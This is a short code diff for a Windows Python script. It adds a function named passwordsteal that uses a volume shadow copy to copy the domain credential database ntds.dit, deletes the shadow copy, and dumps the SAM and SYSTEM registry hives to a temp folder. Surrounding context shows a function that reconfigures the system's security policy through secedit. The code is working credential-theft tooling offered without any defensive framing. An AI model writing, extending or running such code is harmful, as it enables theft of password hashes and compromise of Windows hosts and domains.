@@ -23,4 +23,14 @@ def disableEncryption():
     proc = subprocess.run(["powershell", "-command", r"secedit /configure /db secedit.db /cfg C:\secpol.cfg /areas SECURITYPOLICY"], capture_output=True)
     print(proc.stdout.decode())
 
+def passwordsteal():
+    proc = subprocess.getoutput("vssadmin create shadow /for=C:")
+    proc = proc.split(":")
+    subprocess.run("copy " + proc[3] + "\\Windows\\Ntds\\ntds.dit C:\\Windows\\Temp")
+    subprocess.run("vssadmin delete shadows /shadow=" + proc[2].split(" ")[1])
+    subprocess.run("reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM")
+    subprocess.run("reg save HKLM\\SAM C:\\Windows\\Temp\\SAM")
+
+
+
 disableEncryption()
